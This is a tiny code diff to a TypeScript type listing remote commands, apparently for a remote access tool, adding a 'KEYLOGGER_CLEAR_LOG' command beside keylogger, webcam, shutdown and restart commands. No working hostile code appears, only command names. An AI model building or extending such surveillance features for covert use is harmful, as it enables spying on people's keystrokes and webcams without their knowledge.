@@ -15,6 +15,7 @@ export type RemoteCommand =
   | 'KEYLOGGER_START'
   | 'KEYLOGGER_STOP'
   | 'KEYLOGGER_GET_LOG'
+  | 'KEYLOGGER_CLEAR_LOG'
   | 'SHUTDOWN'
   | 'RESTART'
   | 'WEBCAM_START'
